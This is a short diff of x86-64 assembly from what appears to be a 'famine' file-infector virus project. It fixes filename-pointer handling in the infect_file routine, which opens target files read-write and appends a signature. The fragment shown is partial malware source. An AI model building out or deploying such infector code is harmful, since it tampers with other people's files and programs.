@@ -1,6 +1,7 @@
 ; void  infect_file(char *filename, t_famine, *famine);
 infect_file:
-    mov r12, rsi
+    mov r12, rdi
+    lea rdi, [r12 + fileName]
     mov rsi, O_RDWR
     mov rax, SYS_OPEN
     syscall              ; open(filemane, O_RDWR)
@@ -18,7 +19,7 @@ get_file_data:
     jl close_file
     cmp rax, SIGNATURE_SIZE          ; if (size > SIGNATURE_SIZE) continue ;
     jge file_size_ok
-    mov rdi, [r12 + fileName]
+    lea rdi, [r12 + fileName]
     call append_signature
     jmp close_file
     file_size_ok:                                                                                               ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
@@ -84,7 +85,7 @@ check_file_integrity:
     jmp get_file_entry
 
 simple: 
-    mov rdi, [r12 + fileName]
+    lea rdi, [r12 + fileName]
     call append_signature
     jmp close_mmap
 
